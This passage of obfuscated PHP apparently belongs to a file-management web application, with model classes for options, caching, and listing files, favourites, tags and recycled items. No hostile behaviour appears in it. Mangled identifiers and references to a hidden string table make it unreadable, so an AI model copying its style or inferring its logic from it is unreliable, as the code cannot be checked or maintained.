$õ¬‘£¹ = $õ¬‘£¹ ? $õ¬‘£¹ : 0; $ÉÃ¬‰š¹[$Š¶ûì¨[478]] = ++$õ¬‘£¹; $ÉÃ¬‰š¹[$Š¶ûì¨[234]] = time(); $ÉÃ¬‰š¹[$Š¶ûì¨[88]] = time(); Model($this->modelType)->set($Š¶ûì¨[476], $õ¬‘£¹, $this->optionType . $Š¶ûì¨[477]); Model($this->modelType)->set($Š¶ûì¨[475] . $õ¬‘£¹, $ÉÃ¬‰š¹, $this->optionType); return $õ¬‘£¹; } public function update($åŞÚÜü§, $„¨®ÎØ“) { $„ÇÇú¶Ø =& $_SERVER[ÓïÕü]; $„¨®ÎØ“ = array_field_key($„¨®ÎØ“, $this->field); $ãáŒÏûŞ = $this->listData($åŞÚÜü§); if (!$ãáŒÏûŞ || !$åŞÚÜü§) { return !1; } $„¨®ÎØ“ = array_merge($ãáŒÏûŞ, $„¨®ÎØ“); $„¨®ÎØ“[$„ÇÇú¶Ø[88]] = time(); return Model($this->modelType)->set($„ÇÇú¶Ø[475] . $åŞÚÜü§, $„¨®ÎØ“, $this->optionType); } public function remove($Ğ©¯ Ï’) { if (!$Ğ©¯ Ï’) { return !1; } return Model($this->modelType)->remove($_SERVER[ÓïÕü][475] . $Ğ©¯ Ï’, $this->optionType); } public function clear() { $»úÙİñ¶ =& $_SERVER[ÓïÕü]; Model($this->modelType)->remove($»úÙİñ¶[476], $this->optionType . $»úÙİñ¶[477]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ÿäèü÷ñ, $îÂï€¿ë) { if (!$îÂï€¿ë) { return !1; } $ÙÅ»óÀ = $this->listData(); $ÙÅ»óÀ = array_to_keyvalue($ÙÅ»óÀ, $Ÿäèü÷ñ); return isset($ÙÅ»óÀ[$îÂï€¿ë]) ? $ÙÅ»óÀ[$îÂï€¿ë] : !1; } public function findByName($¦óŒ€ªÑ) { return $this->findByKey($_SERVER[ÓïÕü][32], $¦óŒ€ªÑ); } protected function resetData($ƒ÷×‡€¶) { $Ò—ŞÈ¶ß =& $_SERVER[ÓïÕü]; $ƒ÷×‡€¶ = is_array($ƒ÷×‡€¶) ? $ƒ÷×‡€¶ : array(); $¹éã– = array(); for ($±ıæ¶›¢ = 0; $±ıæ¶›¢ < count($ƒ÷×‡€¶); $±ıæ¶›¢++) { $¹éã–[$Ò—ŞÈ¶ß[475] . $ƒ÷×‡€¶[$±ıæ¶›¢][$Ò—ŞÈ¶ß[478]]] = $ƒ÷×‡€¶[$±ıæ¶›¢]; } return Model($this->modelType)->set($¹éã–, !1, $this->optionType); } private function getAutoName($Ïõ±‹µÅ) { $Ö»Éëµ³ = array_to_keyvalue($this->listData(), $_SERVER[ÓïÕü][32]); if (!$Ö»Éëµ³ || !isset($Ö»Éëµ³[$Ïõ±‹µÅ])) { return $Ïõ±‹µÅ; } for ($¬øó®– = 1; $¬øó®– < count($Ö»Éëµ³); $¬øó®–++) { $¹’Â÷Áá = $Ïõ±‹µÅ . "\x28{$¬øó®–}\x29"; if (!isset($Ö»Éëµ³[$¹’Â÷Áá])) { return $¹’Â÷Áá; } } return $¹’Â÷Áá; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ËÂï¨Èá = false, $‚øŠ’² = '', $†Ôïãù× = false) { $òÂäÔıñ =& $_SERVER[ÓïÕü]; $üÉ‰Øì¤ = $this->cacheGet($‚øŠ’²); $ÖœààÉ = $this->optionDefault($‚øŠ’²); $ÖœààÉ = is_array($ÖœààÉ) ? $ÖœààÉ : array(); if (is_array($üÉ‰Øì¤)) { $üÉ‰Øì¤ = array_merge($ÖœààÉ, $üÉ‰Øì¤); return $ËÂï¨Èá ? isset($üÉ‰Øì¤[$ËÂï¨Èá]) ? $üÉ‰Øì¤[$ËÂï¨Èá] : null : $üÉ‰Øì¤; } $æ›Ü´Ó± = $this->filterWhere(array($òÂäÔıñ[33] => $‚øŠ’²)); $üÉ‰Øì¤ = $this->where($æ›Ü´Ó±)->select(); $üÉ‰Øì¤ = array_to_keyvalue($üÉ‰Øì¤, $òÂäÔıñ[97], $òÂäÔıñ[453]); foreach ($üÉ‰Øì¤ as $ıüˆßåë => $Û£‹¾Ñ) { if ($†Ôïãù× || in_array($ıüˆßåë, $this->jsonField)) { $üÉ‰Øì¤[$ıüˆßåë] = json_decode($Û£‹¾Ñ, !0); } } $this->cacheSet($‚øŠ’², $üÉ‰Øì¤); $üÉ‰Øì¤ = array_merge($ÖœààÉ, $üÉ‰Øì¤); return $ËÂï¨Èá ? $üÉ‰Øì¤[$ËÂï¨Èá] : $üÉ‰Øì¤; } public function set($–ùäü·†, $Œ–‘ºé = false, $®ä®–çÏ = '') { $Êåëàó =& $_SERVER[ÓïÕü]; $this->cacheRemove($®ä®–çÏ); $´¤‰©ÌÍ = array(); $èØçõï = is_array($–ùäü·†) ? $–ùäü·† : array($–ùäü·† => $Œ–‘ºé); foreach ($èØçõï as $Ò¾¢°†× => $ƒÜûƒû) { if (is_array($ƒÜûƒû)) { $ƒÜûƒû = json_encode_force($ƒÜûƒû); } $this->checkLength($ƒÜûƒû, !1, $this->tableName . $Êåëàó[4] . $–ùäü·†); $ƒÜûƒû = self::textEncode($ƒÜûƒû); $èØçõï = array($Êåëàó[33] => $®ä®–çÏ, $Êåëàó[97] => $Ò¾¢°†×, $Êåëàó[453] => $ƒÜûƒû); $´¤‰©ÌÍ[] = $this->filterWhere($èØçõï); } if (!$´¤‰©ÌÍ) { return !0; } $À¯Õ”İÕ = $this->cacheKey($Êåëàó[479]); CacheLock::lock($À¯Õ”İÕ); $˜¥òÔö¼ = $this->addAll($´¤‰©ÌÍ, array(), !0); CacheLock::unlock($À¯Õ”İÕ); return $˜¥òÔö¼; } protected function optionDefault($¬†àÈ¨ì = '') { return !1; } public function setDeep($…ı¼ØÃ, $Ä¨¾£ï« = false, $ĞÌœ½ÑÙ = '') { $£Œ¯å‚ = explode($_SERVER[ÓïÕü][10], $…ı¼ØÃ); $œ¨ƒ»Ö = $this->get(); array_set_value($œ¨ƒ»Ö, $…ı¼ØÃ, $Ä¨¾£ï«); $this->set($£Œ¯å‚[0], $œ¨ƒ»Ö[$£Œ¯å‚[0]], $ĞÌœ½ÑÙ); } public function remove($¥ÍÀœ‚°, $èá§­é = '') { $¤›áíÅÎ =& $_SERVER[ÓïÕü]; $this->cacheRemove($èá§­é); $ŠØí±¾ä = $this->filterWhere(array($¤›áíÅÎ[97] => $¥ÍÀœ‚°, $¤›áíÅÎ[33] => $èá§­é)); if (is_null($¥ÍÀœ‚°)) { unset($ŠØí±¾ä[$¤›áíÅÎ[97]]); } return $this->where($ŠØí±¾ä)->delete(); } public function cacheSet($™·Ú¨¹¶, $Ä¥Ãóø = false) { return Cache::set($this->cacheKey($™·Ú¨¹¶), $Ä¥Ãóø); } public function cacheGet($´Òúà¯ª) { return Cache::get($this->cacheKey($´Òúà¯ª)); } public function cacheRemove($íºï¹) { return Cache::remove($this->cacheKey($íºï¹)); } protected function filterWhere($´øƒ‰¾õ) { return $´øƒ‰¾õ; } protected function cacheKey($Åá×à±Ã) { return $Åá×à±Ã; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\143\145"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\x6d\x65" => "\151\157\x5f\x73\x6f\x75\x72\x63\x65\x5f\x6d\145\x74\141", "\x6d\145\x74\x61\x46\151\145\154\144" => "\163\157\x75\x72\x63\x65\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\151\x6d\145", "\164\x69\155\145", "\x69\x6e\163\x65\x72\x74", "\x66\x75\156\143\x74\x69\x6f\156"), array("\x63\162\x65\x61\164\145\124\x69\155\x65", "\164\x69\155\145", "\151\x6e\163\145\x72\x74", "\x66\165\x6e\x63\164\151\157\x6e"), array("\166\151\x65\x77\124\x69\155\145", "\164\151\x6d\x65", "\x69\156\163\x65\162\x74", "\146\165\156\143\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($òÄ’ü÷ï) { return $this->listSource(array($_SERVER[ÓïÕü][480] => $òÄ’ü÷ï)); } public function typeName($åóä¶úŒ) { static $ü„é›ä = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\x65\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $ü„é›ä[$åóä¶úŒ . $_SERVER[ÓïÕü][12]]; } public function sourceListInfo($Ï’äÁÖĞ, $ˆ–º¶şš = false) { $Ç÷‡ë°• =& $_SERVER[ÓïÕü]; $Ï’äÁÖĞ = $Ï’äÁÖĞ ? $Ï’äÁÖĞ : array(); $Ï’äÁÖĞ = array_filter(array_unique($Ï’äÁÖĞ)); if (!$Ï’äÁÖĞ) { return array(); } $›øÑÙØÚ = $this->where(array($Ç÷‡ë°•[194] => array($Ç÷‡ë°•[7], $Ï’äÁÖĞ)))->select(); $this->_listDataApply($›øÑÙØÚ, $ˆ–º¶şš); return array_to_keyvalue($›øÑÙØÚ, $Ç÷‡ë°•[194]); } public function pathInfoFilter(&$ËñïÏö) { $›¶¹É•ô =& $_SERVER[ÓïÕü]; static $ÃšØÓö‘ = false; static $µ¤ğ”úœ = false; static $¤·¾Ä­‚ = false; if (!$ÃšØÓö‘) { $˜ëìÕ°º = $›¶¹É•ô[481]; $˜ëìÕ°º .= $›¶¹É•ô[482]; $˜ëìÕ°º .= $›¶¹É•ô[483]; $ÔÖ…ŒÒÈ = $›¶¹É•ô[484]; $Ç•†Š£ = explode($›¶¹É•ô[50], $ÔÖ…ŒÒÈ); $ÃšØÓö‘ = explode($›¶¹É•ô[50], $˜ëìÕ°º); $µ¤ğ”úœ = array(); foreach ($ÃšØÓö‘ as $˜ ¸îÓ) { if (in_array($˜ ¸îÓ, $Ç•†Š£)) { continue; } $µ¤ğ”úœ[] = $˜ ¸îÓ; } $¤·¾Ä­‚ = explode($›¶¹É•ô[50], $›¶¹É•ô[485]); } foreach ($¤·¾Ä­‚ as $ƒòºöÕ) { if (isset($ËñïÏö[$ƒòºöÕ])) { $ËñïÏö[$ƒòºöÕ] = intval($ËñïÏö[$ƒòºöÕ]); } } $ËñïÏö[$›¶¹É•ô[87]] = $›¶¹É•ô[486] . $ËñïÏö[$›¶¹É•ô[194]] . $›¶¹É•ô[487]; $ËñïÏö[$›¶¹É•ô[33]] = $ËñïÏö[$›¶¹É•ô[488]] == 1 ? $›¶¹É•ô[78] : $›¶¹É•ô[233]; $ËñïÏö[$›¶¹É•ô[191]] = $this->typeName($ËñïÏö[$›¶¹É•ô[191]]); if ($ËñïÏö[$›¶¹É•ô[488]] != 1) { $ËñïÏö[$›¶¹É•ô[169]] = $ËñïÏö[$›¶¹É•ô[489]]; unset($ËñïÏö[$›¶¹É•ô[489]]); } $Ú¾Ó¹Âê = $ÃšØÓö‘; if (isset($ËñïÏö[$›¶¹É•ô[490]]) && $ËñïÏö[$›¶¹É•ô[490]][$›¶¹É•ô[491]] == -1) { $Ú¾Ó¹Âê = $µ¤ğ”úœ; } $ËñïÏö = array_field_key($ËñïÏö, $Ú¾Ó¹Âê); return $ËñïÏö; } public function listUserFav() { $ı¢±‘Ô° =& $_SERVER[ÓïÕü]; $³­øºù = Model($ı¢±‘Ô°[492])->listData(); $¦ñœ¡Í¶ = array_filter_by_field($³­øºù, $ı¢±‘Ô°[33], $ı¢±‘Ô°[493]); $¦ñœ¡Í¶ = array_to_keyvalue($¦ñœ¡Í¶, $ı¢±‘Ô°[12], $ı¢±‘Ô°[87]); if ($¦ñœ¡Í¶) { $·ĞıŒåÀ = $this->listSource(array($ı¢±‘Ô°[494] => array($ı¢±‘Ô°[495], $¦ñœ¡Í¶))); } $·ĞıŒåÀ = array_to_keyvalue($·ĞıŒåÀ[$ı¢±‘Ô°[448]], $ı¢±‘Ô°[194]); foreach ($³­øºù as &$­°¡›…ó) { $­°¡›…ó = array($ı¢±‘Ô°[496] => $­°¡›…ó[$ı¢±‘Ô°[478]], $ı¢±‘Ô°[497] => $­°¡›…ó[$ı¢±‘Ô°[32]], $ı¢±‘Ô°[498] => $­°¡›…ó[$ı¢±‘Ô°[87]], $ı¢±‘Ô°[499] => $­°¡›…ó[$ı¢±‘Ô°[33]], $ı¢±‘Ô°[500] => $­°¡›…ó[$ı¢±‘Ô°[234]], $ı¢±‘Ô°[501] => $­°¡›…ó[$ı¢±‘Ô°[88]]); if ($­°¡›…ó[$ı¢±‘Ô°[33]] == $ı¢±‘Ô°[493] && $·ĞıŒåÀ[$­°¡›…ó[$ı¢±‘Ô°[87]]]) { $­°¡›…ó[$ı¢±‘Ô°[90]] = $·ĞıŒåÀ[$­°¡›…ó[$ı¢±‘Ô°[87]]]; } } unset($­°¡›…ó); return $³­øºù; } public function listUserTag($»şŠÚªñ) { $³øö¨ÃØ =& $_SERVER[ÓïÕü]; if ($»şŠÚªñ && !is_array($»şŠÚªñ)) { $»şŠÚªñ = array($»şŠÚªñ); } $ó“ãìÓÌ = Model($³øö¨ÃØ[502])->listData(); $ŞÆû†¬± = array(); $¦»™ÔæÆ = array(); foreach ($ó“ãìÓÌ as $•ÓüÖë) { $‘»€üÕ‰ = $•ÓüÖë[$³øö¨ÃØ[87]]; if (!$‘»€üÕ‰) { continue; } if (!isset($¦»™ÔæÆ[$‘»€üÕ‰])) { $¦»™ÔæÆ[$‘»€üÕ‰] = array(); } $¦»™ÔæÆ[$‘»€üÕ‰][] = $•ÓüÖë[$³øö¨ÃØ[503]]; $ŞÆû†¬±[$•ÓüÖë[$³øö¨ÃØ[87]]] = $•ÓüÖë; } $óÍØ…ùç = array(); $¼œÎü¹Ö = array(); $ø™ßâ©° = array(); foreach ($¦»™ÔæÆ as $ªÇÆ¼ıú => $±ƒéÍé„) { $÷Şœ Ìœ = !0; if (!$»şŠÚªñ) { $óÍØ…ùç[] = $ªÇÆ¼ıú; continue; } foreach ($»şŠÚªñ as $ıÆçÜ¯¢) { if (!in_array($ıÆçÜ¯¢, $±ƒéÍé„)) { $÷Şœ Ìœ = !1; break; } } if (!$÷Şœ Ìœ) { continue; } if (!is_numeric($ªÇÆ¼ıú)) { $òß·ìÙ± = $ŞÆû†¬±[$ªÇÆ¼ıú]; $îú—ó©© = array($³øö¨ÃØ[32] => $òß·ìÙ±[$³øö¨ÃØ[32]], $³øö¨ÃØ[87] => $òß·ìÙ±[$³øö¨ÃØ[87]], $³øö¨ÃØ[33] => $òß·ìÙ±[$³øö¨ÃØ[33]], $³øö¨ÃØ[90] => array($³øö¨ÃØ[504] => 1), $³øö¨ÃØ[235] => !0); if ($òß·ìÙ±[$³øö¨ÃØ[33]] == $³øö¨ÃØ[233]) { $ø™ßâ©°[] = $îú—ó©©; } if ($òß·ìÙ±[$³øö¨ÃØ[33]] == $³øö¨ÃØ[78]) { $¼œÎü¹Ö[] = $îú—ó©©; } continue; } $óÍØ…ùç[] = $ªÇÆ¼ıú; } if ($óÍØ…ùç) { $’†Ğç™¨ = $this->listSource(array($³øö¨ÃØ[494] => array($³øö¨ÃØ[495], $óÍØ…ùç))); } $’†Ğç™¨ = $’†Ğç™¨ ? $’†Ğç™¨ : array($³øö¨ÃØ[85] => array(), $³øö¨ÃØ[86] => array()); $’†Ğç™¨[$³øö¨ÃØ[85]] = array_merge($’†Ğç™¨[$³øö¨ÃØ[85]], $¼œÎü¹Ö); $’†Ğç™¨[$³øö¨ÃØ[86]] = array_merge($’†Ğç™¨[$³øö¨ÃØ[86]], $ø™ßâ©°); if (isset($’†Ğç™¨[$³øö¨ÃØ[445]]) && count($óÍØ…ùç) == $’†Ğç™¨[$³øö¨ÃØ[445]][$³øö¨ÃØ[446]]) { return $’†Ğç™¨; } $ÊëÇƒ™× = array(); $¤ç®Ÿ°Í = array_to_keyvalue($’†Ğç™¨[$³øö¨ÃØ[85]], $³øö¨ÃØ[12], $³øö¨ÃØ[194]); $àòÚ¯±ó = array_to_keyvalue($’†Ğç™¨[$³øö¨ÃØ[86]], $³øö¨ÃØ[12], $³øö¨ÃØ[194]); $µŸÚ ¦ = array_merge($àòÚ¯±ó, $¤ç®Ÿ°Í); foreach ($óÍØ…ùç as $‘»€üÕ‰) { if (!in_array($‘»€üÕ‰, $µŸÚ ¦)) { $ÊëÇƒ™×[] = $‘»€üÕ‰; } } if ($ÊëÇƒ™×) { Model($³øö¨ÃØ[505])->removeBySource($ÊëÇƒ™×); } return $’†Ğç™¨; } public function listUserRecycle() { $Ï´ß˜óŒ =& $_SERVER[ÓïÕü]; $Ææ»‘±° = Model($Ï´ß˜óŒ[506])->listData(); if (!$Ææ»‘±°) { return array(); } $µäÃ°ˆ‹ = array($Ï´ß˜óŒ[494] => array($Ï´ß˜óŒ[495], $Ææ»‘±°), $Ï´ß˜óŒ[507] => 1); return $this->listSource($µäÃ°ˆ‹); } public function listSource($©Æ‘õãÆ, $´¼–õ‘ = 3000, $“ƒ§”° = false) { $§Àôª—ß =& $_SERVER[ÓïÕü]; if (!isset($©Æ‘õãÆ[$§Àôª—ß[508]])) { $©Æ‘õãÆ[$§Àôª—ß[508]] = 0; } if (isset($©Æ‘õãÆ[$§Àôª—ß[193]]) && $©Æ‘õãÆ[$§Àôª—ß[193]] == $§Àôª—ß[231]) { $©Æ‘õãÆ[$§Àôª—ß[489]] = array($§Àôª—ß[509], $§Àôª—ß[12]); } $ç¾ó†ó¡ = $§Àôª—ß[510]; $¦ùö¨‰ = $this->field($ç¾ó†ó¡)->_makeOrder()->where($©Æ‘õãÆ)->selectPage($´¼–õ‘); $this->_listPageCheck($¦ùö¨‰, $ç¾ó†ó¡, $©Æ‘õãÆ); $this->_listDataApply($¦ùö¨‰[$§Àôª—ß[448]], $“ƒ§”°); $this->_listMake($¦ùö¨‰); return $¦ùö¨‰; } private function _listPageCheck(&$¹‘¡ş‰, $†˜ÇÄúÀ, $áÕÉ’ˆ) { $¬«øñº =& $_SERVER[ÓïÕü]; if (!is_array($¹‘¡ş‰[$¬«øñº[445]])) { return; } $˜ŞƒõÓÂ = $¹‘¡ş‰[$¬«øñº[445]]; if ($˜ŞƒõÓÂ[$¬«øñº[447]] <= 1) { return; } if ($˜ŞƒõÓÂ[$¬«øñº[446]] >= 100000) { return; } if (Model($¬«øñº[511])->get($¬«øñº[512]) != $¬«øñº[513]) { return; } $†˜ÇÄúÀ = str_replace(array($¬«øñº[53], $¬«øñº[420], $¬«øñº[288]), $¬«øñº[12], $†˜ÇÄúÀ); $†˜ÇÄúÀ = $¬«øñº[514] . str_replace($¬«øñº[50], $¬«øñº[515], $†˜ÇÄúÀ) . $¬«øñº[516]; $ÆŸ’›É¼ = $¬«øñº[517]; $ÆŸ’›É¼ = $ÆŸ’›É¼ . $¬«øñº[518]; $ÉÛ¶ÉŞ = $˜ŞƒõÓÂ[$¬«øñº[442]] * ($˜ŞƒõÓÂ[$¬«øñº[431]] - 1) . $¬«øñº[50] . $˜ŞƒõÓÂ[$¬«øñº[442]]; $ÔÕä—Ñ£ = $this->_makeOrder(!0); $ä©É–¹® = $¬«øñº[514] . str_replace($¬«øñº[50], $¬«øñº[515], $ÔÕä—Ñ£[0]); if (strpos($ä©É–¹®, $¬«øñº[519])) { $ä©É–¹® = str_replace($¬«øñº[519], $¬«øñº[520], $ä©É–¹®); } else { $ä©É–¹® .= $¬«øñº[521] . $ÔÕä—Ñ£[1]; } $ÃçÓ¿¬Â = array(); foreach ($áÕÉ’ˆ as $¦âÚ§âº => $Ç¹ı©¡Ã) { $ÃçÓ¿¬Â[$¬«øñº[514] . $¦âÚ§âº] = $Ç¹ı©¡Ã; } $this->alias($¬«øñº[522])->field($†˜ÇÄúÀ)->limit($ÉÛ¶ÉŞ)->order($ä©É–¹®); $ŒˆíüĞ = $this->join($ÆŸ’›É¼)->where($ÃçÓ¿¬Â)->select(); if ($ŒˆíüĞ) { $¹‘¡ş‰[$¬«øñº[448]] = $ŒˆíüĞ; } } protected function _makeOrder($ãë¯û«İ = false) { $Äîµç€Ÿ =& $_SERVER[ÓïÕü]; $ÆÃ×±ˆ = Model($Äîµç€Ÿ[523])->get($Äîµç€Ÿ[524]); $ëæ¢ê— = Model($Äîµç€Ÿ[523])->get($Äîµç€Ÿ[525]); $°¿ÍŒ‰ = array($Äîµç€Ÿ[526] => $Äîµç€Ÿ[527], $Äîµç€Ÿ[528] => $Äîµç€Ÿ[529]); $ó€‘õú = array($Äîµç€Ÿ[32] => $Äîµç€Ÿ[32], $Äîµç€Ÿ[79] => $Äîµç€Ÿ[79], $Äîµç€Ÿ[169] => $Äîµç€Ÿ[489], $Äîµç€Ÿ[530] => $Äîµç€Ÿ[530], $Äîµç€Ÿ[531] => $Äîµç€Ÿ[532], $Äîµç€Ÿ[234] => $Äîµç€Ÿ[234], $Äîµç€Ÿ[88] => $Äîµç€Ÿ[88]); $Ï¶ĞŠÓÌ = Input::get($Äîµç€Ÿ[533], $Äîµç€Ÿ[7], $ÆÃ×±ˆ, array_keys($ó€‘õú)); $¥şìÊ = Input::get($Äîµç€Ÿ[534], $Äîµç€Ÿ[7], $ëæ¢ê—, array_keys($°¿ÍŒ‰)); if (!in_array($Ï¶ĞŠÓÌ, array_keys($ó€‘õú))) { $Ï¶ĞŠÓÌ = $Äîµç€Ÿ[32]; } if (!in_array($¥şìÊ, array_keys($°¿ÍŒ‰))) { $Ï¶ĞŠÓÌ = $Äîµç€Ÿ[526]; } if ($Ï¶ĞŠÓÌ == $Äîµç€Ÿ[32]) { } $í„¸äãù = $Äîµç€Ÿ[535] . $ó€‘õú[$Ï¶ĞŠÓÌ] . $Äîµç€Ÿ[53] . $°¿ÍŒ‰[$¥şìÊ]; $í„¸äãù = rtrim(trim($í„¸äãù), $Äîµç€Ÿ[50]); if ($ãë¯û«İ) { return array($í„¸äãù, $°¿ÍŒ‰[$¥şìÊ]); } return $this->order($í„¸äãù); } protected function _listDataApplyItem($ĞŠËÉ, $€”Üûå = false) { $¤ÃÈ˜æì = array($ĞŠËÉ); $this->_listDataApply($¤ÃÈ˜æì, $€”Üûå); return $¤ÃÈ˜æì[0]; } protected function _listDataApply(&$Š¿‘˜Ó¬, $ò¶Ğ‹ú = false) { $ü“¯Š• =& $_SERVER[ÓïÕü]; if (!$Š¿‘˜Ó¬) { $Š¿‘˜Ó¬ = array(); return; } $…„«¦º¨ = array_to_keyvalue($Š¿‘˜Ó¬, $ü“¯Š•[12], $ü“¯Š•[194]); $…„«¦º¨ = array_unique($…„«¦º¨); $this->_listSourceCache($Š¿‘˜Ó¬); if (!$ò¶Ğ‹ú) { $this->_listAppendMeta($Š¿‘˜Ó¬, $…„«¦º¨); $this->_listAppendFileMeta($Š¿‘˜Ó¬, $…„«¦º¨); $this->_listAppendChildren($Š¿‘˜Ó¬, $…„«¦º¨); } $this->_listAppendPath($Š¿‘˜Ó¬); $this->_listAppendAuth($Š¿‘˜Ó¬); $this->_listAppendSourceInfo($Š¿‘˜Ó¬, $…„«¦º¨); $this->_listAppendUser($Š¿‘˜Ó¬); $this->_listFilterInfo($Š¿‘˜Ó¬, $ò¶Ğ‹ú); $this->_listAppendAuthSecret($Š¿‘˜Ó¬); } protected function _listSourceCache($Ğ ñç«) { $éğÚ’¦æ =& $_SERVER[ÓïÕü]; foreach ($Ğ ñç« as $–Å²±©É) { self::$cacheSourceInfo[$éğÚ’¦æ[536] . $–Å²±©É[$éğÚ’¦æ[194]]] = $–Å²±©É; } } protected function _listFilterInfo(&$ñ¡ØÖÍÆ, $¦Ã–£Òú = false) { $áİ÷Ä‹ê =& $_SERVER[ÓïÕü]; foreach ($ñ¡ØÖÍÆ as &$Íåó‘ŞŠ) { $Íåó‘ŞŠ = $this->pathInfoFilter($Íåó‘ŞŠ); self::$cachePathInfo[$áİ÷Ä‹ê[537] . intval($¦Ã–£Òú) . $áİ÷Ä‹ê[465] . $Íåó‘ŞŠ[$áİ÷Ä‹ê[194]]] = $Íåó‘ŞŠ; } unset($Íåó‘ŞŠ); } protected function _listMake(&$Àñ°ûëÛ) { $â ñà¢Ş =& $_SERVER[ÓïÕü]; $Àñ°ûëÛ[$â ñà¢Ş[85]] = array(); $Àñ°ûëÛ[$â ñà¢Ş[86]] = array(); foreach ($Àñ°ûëÛ[$â ñà¢Ş[448]] as $™·ÅÎ¡´) { $øÒÄ´ = $™·ÅÎ¡´[$â ñà¢Ş[488]] == 1 ? $â ñà¢Ş[85] : $â ñà¢Ş[86]; $Àñ°ûëÛ[$øÒÄ´][] = $™·ÅÎ¡´; } unset($Àñ°ûëÛ[$â ñà¢Ş[448]]); } protected function _listAppendMeta(&$¨ Æ–ø’, $»ââêŠÓ) { $ÖæÀùïµ =& $_SERVER[ÓïÕü]; $®ÎÓ–‡Ô = array($ÖæÀùïµ[494] => array($ÖæÀùïµ[495], $»ââêŠÓ)); $˜µĞæ˜ = Model($ÖæÀùïµ[538])->field($ÖæÀùïµ[539])->where($®ÎÓ–‡Ô)->select(); if (!$˜µĞæ˜) { return; } $£æ–•Â = array($ÖæÀùïµ[540], $ÖæÀùïµ[541], $ÖæÀùïµ[520]); $ˆÃŸ³òï = array(); foreach ($˜µĞæ˜ as $•œÅÙöÁ) { if (!isset($ˆÃŸ³òï[$•œÅÙöÁ[$ÖæÀùïµ[194]]])) { $ˆÃŸ³òï[$•œÅÙöÁ[$ÖæÀùïµ[194]]] = array(); } if (in_array($•œÅÙöÁ[$ÖæÀùïµ[97]], $£æ–•Â)) { continue; } if ($•œÅÙöÁ[$ÖæÀùïµ[97]] == $ÖæÀùïµ[542]) { $•œÅÙöÁ[$ÖæÀùïµ[453]] = $ÖæÀùïµ[543]; } $ˆÃŸ³òï[$•œÅÙöÁ[$ÖæÀùïµ[194]]][$•œÅÙöÁ[$ÖæÀùïµ[97]]] = $•œÅÙöÁ[$ÖæÀùïµ[453]]; } foreach ($¨ Æ–ø’ as &$®ßõ³ò) { $®ßõ³ò[$ÖæÀùïµ[544]] = !1; if (isset($ˆÃŸ³òï[$®ßõ³ò[$ÖæÀùïµ[194]]])) { $®ßõ³ò[$ÖæÀùïµ[544]] = $ˆÃŸ³òï[$®ßõ³ò[$ÖæÀùïµ[194]]]; } if ($this->fileIsLock($®ßõ³ò) && $®ßõ³ò[$ÖæÀùïµ[490]]) { $£§Í÷šô = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $®ßõ³ò[$ÖæÀùïµ[490]][$ÖæÀùïµ[491]] = AuthModel::authDisable($®ßõ³ò[$ÖæÀùïµ[490]][$ÖæÀùïµ[491]], $£§Í÷šô); $®ßõ³ò[$ÖæÀùïµ[490]][$ÖæÀùïµ[545]][$ÖæÀùïµ[490]] = $®ßõ³ò[$ÖæÀùïµ[490]][$ÖæÀùïµ[491]]; } } unset($®ßõ³ò); } protected function _listAppendFileMeta(&$ÍªŸè‚Ş, $ñİö«§ç) { $…í´ÅÊá =& $_SERVER[ÓïÕü]; $•—¯ä¯ = array_to_keyvalue($ÍªŸè‚Ş, $…í´ÅÊá[12], $…í´ÅÊá[546]); $•—¯ä¯ = array_filter(array_unique($•—¯ä¯)); if (!$•—¯ä¯) { return; } $í—®ãµ­ = array($…í´ÅÊá[547] => array($…í´ÅÊá[495], $•—¯ä¯)); $Ü¾åà¼¥ = $…í´ÅÊá[548]; $‚Òª»˜¼ = Model($…í´ÅÊá[549])->field($Ü¾åà¼¥)->where($í—®ãµ­)->select(); $‚Òª»˜¼ = array_to_keyvalue($‚Òª»˜¼, $…í´ÅÊá[546]); $üµÙŞ®¼ = Model($…í´ÅÊá[550])->field($…í´ÅÊá[551])->where($í—®ãµ­)->select(); $üµÙŞ®¼ = $üµÙŞ®¼ ? $üµÙŞ®¼ : array(); $éÇÅ…’ = array(); foreach ($üµÙŞ®¼ as $òÌÌøÜ¥) { if (!isset($éÇÅ…’[$òÌÌøÜ¥[$…í´ÅÊá[546]]])) { $éÇÅ…’[$òÌÌøÜ¥[$…í´ÅÊá[546]]] = array(); } $éÇÅ…’[$òÌÌøÜ¥[$…í´ÅÊá[546]]][$òÌÌøÜ¥[$…í´ÅÊá[97]]] = $òÌÌøÜ¥[$…í´ÅÊá[453]]; } foreach ($ÍªŸè‚Ş as &$³Â·—‰õ) { $ÅûƒÜŒ¤ = $³Â·—‰õ[$…í´ÅÊá[546]]; if (!$ÅûƒÜŒ¤ || !is_array($‚Òª»˜¼[$ÅûƒÜŒ¤])) { continue; } $ºğßò‘³ = $‚Òª»˜¼[$ÅûƒÜŒ¤]; $ºğßò‘³[$…í´ÅÊá[79]] = $³Â·—‰õ[$…í´ÅÊá[79]]; $ºğßò‘³[$…í´ÅÊá[32]] = $³Â·—‰õ[$…í´ÅÊá[32]]; if (!$ºğßò‘³[$…í´ÅÊá[552]]) { Model($…í´ÅÊá[549])->fileMd5Check($ºğßò‘³); } if (!isset(self::$cacheFileInfo[$…í´ÅÊá[553] . $ÅûƒÜŒ¤])) { self::$cacheFileInfo[$…í´ÅÊá[553] . $ÅûƒÜŒ¤] = array_merge(array(), $ºğßò‘³); } unset($‚Òª»˜¼[$ÅûƒÜŒ¤][$…í´ÅÊá[87]]); $ÊÇÁ­‚Ù = isset($éÇÅ…’[$ÅûƒÜŒ¤]) && is_array($éÇÅ…’[$ÅûƒÜŒ¤]) ? $éÇÅ…’[$ÅûƒÜŒ¤] : array(); $³Â·—‰õ[$…í´ÅÊá[170]] = array_merge($ÊÇÁ­‚Ù, 